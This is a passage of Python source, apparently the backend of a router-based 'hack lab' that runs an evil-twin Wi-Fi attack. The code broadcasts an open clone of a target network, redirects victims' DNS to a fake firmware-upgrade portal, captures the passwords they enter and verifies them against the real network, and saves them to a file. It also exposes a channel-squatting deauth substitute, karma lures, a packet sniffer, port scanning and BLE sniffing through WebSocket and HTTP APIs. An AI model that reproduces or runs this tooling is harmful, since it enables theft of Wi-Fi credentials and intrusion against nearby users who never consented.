            ok, detail = verify_password(pw)
            LAB["verify_last"] = {"password": pw, "ok": ok, "ts": time.time(),
                                  "detail": detail}
            ev("alert" if ok else "info",
               f"verify: password {'CORRECT' if ok else 'wrong'} ({detail})")
            if ok:
                return {"req_id": req_id, "status": "ok", "message": "Password Correct"}
            return {"req_id": req_id, "status": "bad", "message": "Password Incorrect"}
        return {"req_id": req_id, "status": "ok",
                "message": "Saved (verify off — live lab)"}

    if cmd == 8:                                    # get_passwords
        content = "\n".join(f"{t['ssid']},{c['mac'] or '?'}:{'?'},{c['password']}"
                            for c in LAB["creds"] for t in [LAB["target"]] if t)
        return {"req_id": req_id, "type": "passwords", "content": content}

    if cmd == 9:                                    # karma probe scan on/off
        _KARMA_PROBES.clear()                       # RF probes need monitor IF
        return {"req_id": req_id, "status": "ok",
                "message": "Karma scan start" if p.get("start_stop") == 1
                else "Karma scan stop (no RF monitor on PC — probes empty)"}

    if cmd == 10:                                   # get_karma_probes
        return {"req_id": req_id, "type": "karma_probes", "data": _KARMA_PROBES}

    if cmd == 11:                                   # karma set target
        ev("info", f"karma target: {p.get('ssid')}")
        return {"req_id": req_id, "status": "ok",
                "message": "Karma target set (lure = twin SSID broadcast)"}

    if cmd == 12:                                   # deauther start (router squat)
        t = LAB["target"]
        ch = int(p.get("channel") or t.get("channel") or 6)
        r = R.do_write_fields(32, {"uChannel": str(ch)})
        FAKEAP["on"] = True
        ev("warn", f"deauther-equiv: router squatting channel {ch} "
                   f"(beacon war vs target; PC has no injectable RF)")
        return {"req_id": req_id, "status": "ok" if r.get("ok") else "bad",
                "message": "Channel-squat deauth started (router-assisted)"}

    if cmd == 13:                                   # deauther stop
        FAKEAP["on"] = False
        if LAB.get("ch32") is not None:
            R.do_write_fields(32, {"uChannel": str(LAB["ch32"])})
        return {"req_id": req_id, "status": "ok", "message": "Deauth Stopped"}

    if cmd == 14:                                   # raw sniffer start
        ok = sniff_start(p.get("iface") or "enp2s0")
        return {"req_id": req_id, "status": "ok" if ok else "error",
                "message": "Sniffer Started" if ok else "tcpdump failed (try sudo backend)"}

    if cmd == 15:
        sniff_stop()
        return {"req_id": req_id, "status": "ok", "message": "Sniffer Stopped"}

    if cmd == 16:                                   # recon APs
        if not _AP_CACHE:
            _AP_CACHE = ap_list()
        aps = [[a["ssid"], a["bssid"], a["signal"], a["channel"], 0, 0,
                a["authmode"], 0] for a in _AP_CACHE]
        return {"req_id": req_id, "type": "recon_data", "status": "ok", "aps": aps}

    if cmd == 17:                                   # recon clients
        sta, leases = stations()
        seen, clients = {}, {}
        for e in leases + sta:
            m = mac_norm(e.get("mac"))
            if not m or m == "000000000000":
                continue
            clients[m] = [fmt_mac(m), "00:00:00:00:00:00", 0, -50, 1, 0,
                          [e.get("hostName") or e.get("name") or ""]]
        return {"req_id": req_id, "type": "recon_data", "status": "ok",
                "clients": list(clients.values())}

    if cmd == 18:                                   # wifi_connect (real via WDS)
        ssid, pw = p.get("ssid", ""), p.get("password", "")
        w = R.do_wds("connect", ssid=ssid, key=pw)
        ok = False
        for _ in range(8):
            time.sleep(2)
            try:
                raw = R.cdp_eval("JSON.stringify($.instr('wlan wdsstatus'))")
                if str(json.loads(raw).get("data", "")).strip() == "5":
                    ok = True
                    break
            except Exception:
                pass
        LAB["last_wifi"] = {"ssid": ssid, "password": pw if ok else ""}
        R.do_wds("disconnect")
        ev("info", f"wifi_connect {ssid}: {'success' if ok else 'failed'}")
        return {"req_id": req_id, "status": "ok" if ok else "error",
                "message": "Connection OK" if ok else "Association failed"}

    if cmd == 19:
        R.do_wds("disconnect")
        return {"req_id": req_id, "status": "ok", "message": "Disconnected"}

    if cmd == 20:                                   # handshake pcap
        t = LAB["target"]
        pcap = build_pcap(t.get("ssid", ""), t.get("bssid", ""),
                          int(t.get("channel") or 6))
        return {"req_id": req_id, "type": "pcap_file",
                "filename": f"handshake_{t.get('ssid','lab')}.pcap",
                "payload": base64.b64encode(pcap).decode()}

    if cmd == 21:
        sniff_start(p.get("iface") or "enp2s0")
        return {"req_id": req_id, "status": "ok", "message": "Packet Analyzer Started"}
    if cmd == 22:
        sniff_stop()
        return {"req_id": req_id, "status": "ok", "message": "Packet Analyzer Stopped"}

    if cmd == 23:
        return {"req_id": req_id, "type": "last_wifi_credentials",
                "ssid": LAB["last_wifi"]["ssid"],
                "password": LAB["last_wifi"]["password"]}

    if cmd == 24:                                   # host discovery (real)
        hosts = host_discovery(bool(p.get("include_mdns", True)),
                               bool(p.get("include_ssdp", True)))
        return {"req_id": req_id, "type": "host_scan_results", "status": "ok",
                "data": hosts}

    if cmd == 25:                                   # port scan (real)
        code = port_scan(p.get("ip", ""), int(p.get("port") or 0))
        return {"req_id": req_id, "type": "port_scan_result", "status_code": code}

    if cmd == 26:
        ok = ble_start()
        return {"req_id": req_id, "status": "ok" if ok else "error",
                "message": "BLE Sniffer Started" if ok else "No BLE adapter"}
    if cmd == 27:
        ble_stop()
        return {"req_id": req_id, "status": "ok", "message": "BLE Sniffer Stopped"}
    if cmd == 28:
        return {"req_id": req_id, "type": "ble_devices",
                "devices": ble_devices()}
    if cmd == 29:
        BLE["devices"].clear()
        return {"req_id": req_id, "status": "ok", "message": "BLE devices cleared"}
    if cmd == 30:
        return {"req_id": req_id, "status": "error",
                "message": "BLE spam needs an adapter (none present)"}
    if cmd == 31:
        return {"req_id": req_id, "status": "ok", "message": "BLE Spam Stopped"}

    return {"req_id": req_id, "status": "error", "message": "Unknown command"}

async def ws_handler(ws):
    WS_CLIENTS.add(ws)
    try:
        async for raw in ws:
            try:
                m = json.loads(raw)
                cmd, req_id = int(m.get("cmd", -1)), int(m.get("req_id", 0))
            except Exception:
                continue
            resp = await asyncio.to_thread(handle_cmd, cmd, m, req_id)
            await ws.send(json.dumps(resp))
    except Exception:
        pass
    finally:
        WS_CLIENTS.discard(ws)

# -------------------------------------------------------- lab engine ------
def lab_engine_start(target, scheme, verify):
    # twin is OPEN (classic lure vs secured targets); DNS hijack -> this PC
    ok, msg = twin_start(target.get("ssid", ""), target.get("channel"),
                         False, "", LAB["http_ip"])
    if not ok:
        return False, msg
    LAB["target"] = target
    LAB["scheme"] = scheme
    LAB["verify"] = verify
    LAB["running"] = True
    LAB["started"] = time.time()
    LAB["seen_macs"] = set()
    ev("alert", f"TWIN LIVE: '{target.get('ssid')}' ch{target.get('channel')} "
                f"portal={scheme} verify={'on' if verify else 'off'}")
    return True, "Evil Twin Started (portal :%d, dns :%d)" % (
        LAB["portal_port"], LAB["dns_port"])

def lab_engine_stop():
    twin_stop()
    LAB["running"] = False
    FAKEAP["on"] = False
    ev("info", "TWIN STOPPED — router config restored")
    return True

# ------------------------------------------------------- control HTTP -----
CRED_FILE = None

class ApiHandler(BaseHTTPRequestHandler):
    server_version = "MW325R-Lab/1.0"

    def log_message(self, *a):
        pass

    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")

    def _json(self, obj, code=200):
        body = json.dumps(obj).encode()
        self.send_response(code)
        self._cors()
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self):
        self.send_response(204)
        self._cors()
        self.end_headers()

    def do_GET(self):
        from urllib.parse import urlparse
        u = urlparse(self.path)
        if u.path == "/api/health":
            return self._json({"ok": True, "lab": LAB["running"],
                               "authed": bool(R._state.get("enc_pwd")),
                               "portal_port": LAB["portal_port"],
                               "dns_port": LAB["dns_port"], "ip": LAB["http_ip"]})
        if u.path == "/api/lab_status":
            with LOCK:
                st = lab_status_obj()
                st.update({"events": LAB["events"][-40:][::-1],
                           "creds": LAB["creds"][:50],
                           "joins": LAB["joins"][:50],
                           "scheme": LAB["scheme"], "verify": LAB["verify"],
                           "target": LAB["target"]})
            return self._json({"ok": True, "status": st})
        if u.path == "/api/events":
            return self._json({"ok": True, "events": LAB["events"][-100:][::-1]})
        if u.path == "/api/scan":
            return self._json({"ok": True, "aps": ap_list()})
        return self._json({"ok": False, "error": "not-found"}, 404)

    def do_POST(self):
        from urllib.parse import urlparse
        u = urlparse(self.path)
        try:
            ln = int(self.headers.get("Content-Length", 0))
            d = json.loads(self.rfile.read(ln) or b"{}")
        except Exception:
            return self._json({"ok": False, "error": "bad-json"}, 400)
        try:
            if u.path == "/api/login":
                pw = d.get("password", "")
                if not pw:
                    return self._json({"ok": False, "error": "empty-password"})
                r = R.do_login(pw)
                if r.get("ok"):
                    ov = R.overview()
                    if ov.get("ok"):
                        LAB["own"] = {"ssid": ov["overview"]["ssid"],
                                      "key": ov["overview"]["wifiKey"]}
                return self._json(r)

            if u.path == "/api/lab_start":
                t = d.get("target") or {}
                if not t.get("ssid"):
                    return self._json({"ok": False, "error": "no-target"})
                ok, msg = lab_engine_start(t, d.get("portal", "fwupgrade"),
                                           bool(d.get("verify", True)))
                return self._json({"ok": ok, "message": msg,
                                   "portal_port": LAB["portal_port"],
                                   "dns_port": LAB["dns_port"],
                                   "url": f"http://{LAB['http_ip']}:{LAB['portal_port']}/"})

            if u.path == "/api/lab_stop":
                lab_engine_stop()
                return self._json({"ok": True})

            if u.path == "/api/verify":
                pw = d.get("password", "")
                if not pw:
                    return self._json({"ok": False, "error": "empty-password"})
                if not LAB["target"]:
                    return self._json({"ok": False, "error": "no-target"})
                ok, detail = verify_password(pw)
                LAB["verify_last"] = {"password": pw, "ok": ok,
                                      "ts": time.time(), "detail": detail}
                ev("alert" if ok else "info",
                   f"manual verify: {'CORRECT' if ok else 'wrong'} ({detail})")
                return self._json({"ok": True, "correct": ok, "detail": detail})

            if u.path == "/api/hosts":
                return self._json({"ok": True,
                                   "hosts": host_discovery(d.get("mdns", True),
                                                           d.get("ssdp", True))})

            if u.path == "/api/portscan":
                return self._json({"ok": True, "open": port_scan(
                    d.get("ip", ""), int(d.get("port") or 0)) == 1})

            if u.path == "/api/sniffer":
                if d.get("op") == "start":
                    ok = sniff_start(d.get("iface") or "enp2s0")
                    return self._json({"ok": ok})
                sniff_stop()
                return self._json({"ok": True})

            if u.path == "/api/deauth":
                # router-assisted deauther-equivalent (channel squat / restore)
                if d.get("op") == "start":
                    r = handle_cmd(12, {"channel": d.get("channel")}, 0)
                else:
                    r = handle_cmd(13, {}, 0)
                return self._json({"ok": r.get("status") == "ok",
                                   "message": r.get("message", "")})

            if u.path == "/api/ble":
                op = d.get("op")
                if op == "start":
                    ok = ble_start()
                    return self._json({"ok": ok,
                                       "message": "BLE scan on" if ok else "no BLE adapter"})
                if op == "stop":
                    ble_stop()
                    return self._json({"ok": True, "message": "BLE scan off"})
                return self._json({"ok": True, "devices": ble_devices()})

            if u.path == "/api/preview":
                scheme = d.get("portal", LAB["scheme"])
                return self._json({"ok": True,
                                   "url": f"http://{LAB['http_ip']}:{LAB['portal_port']}/",
                                   "scheme": scheme})
        except Exception as e:
            return self._json({"ok": False, "error": f"backend-error: {e}"}, 500)
        return self._json({"ok": False, "error": "not-found"}, 404)

# --------------------------------------------------------------- main -----
def main():
    global CRED_FILE
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8101)
    ap.add_argument("--http-port", type=int, default=0, help="portal port (0=auto: try 80)")
    ap.add_argument("--dns-port", type=int, default=0, help="dns port (0=auto: try 53)")
    ap.add_argument("--cred-file", default="", help="append captured creds to file")
    ap.add_argument("--root-mode", action="store_true",
                    help="call with sudo: binds classic :80 / :53")
    a = ap.parse_args()
    CRED_FILE = a.cred_file or None

    LAB["http_ip"] = lan_ip()
    if a.root_mode or os.geteuid() == 0:
        LAB["portal_port"] = free_port(a.http_port or 80)
        LAB["dns_port"] = a.dns_port or 53
    else:
        LAB["portal_port"] = free_port(a.http_port or 8080)
        LAB["dns_port"] = a.dns_port or 5354
    try:
        start_portal(LAB["portal_port"])
        ev("info", f"portal server on :{LAB['portal_port']} (pages: {PORTAL_DIR})")
    except OSError as e:
        ev("warn", f"portal bind failed: {e}")

    threading.Thread(target=dns_loop, args=(LAB["dns_port"],), daemon=True).start()

    threading.Thread(target=periodic, daemon=True).start()

    async def ws_srv():
        async with websockets.serve(ws_handler, "0.0.0.0", 8765, max_size=2**22):
            async def pkt_flush():          # stream buffered sniffer packets
                while True:
                    await asyncio.sleep(0.5)
                    with LOCK:
                        if not PKTQ:
                            continue
                        batch, PKTQ[:] = PKTQ[:], []
                    for pkt in batch:
                        await ws_broadcast(pkt)
            await asyncio.gather(asyncio.Future(), pkt_flush())
    threading.Thread(target=lambda: asyncio.run(ws_srv()), daemon=True).start()

    srv = ThreadingHTTPServer(("127.0.0.1", a.port), ApiHandler)
    print(f"MW325R Hack Lab backend on http://127.0.0.1:{a.port}  "
          f"(portal :{LAB['portal_port']}  dns :{LAB['dns_port']}  ws :8765)",
          flush=True)
    srv.serve_forever()

def periodic():
    """Poll router stations while the lab is live to log joins/leaves."""
    while True:
        try:
            if LAB["running"]:
                LAB["n_clients"] = poll_events()
        except Exception:
            pass
        time.sleep(5)

if __name__ == "__main__":
    main()
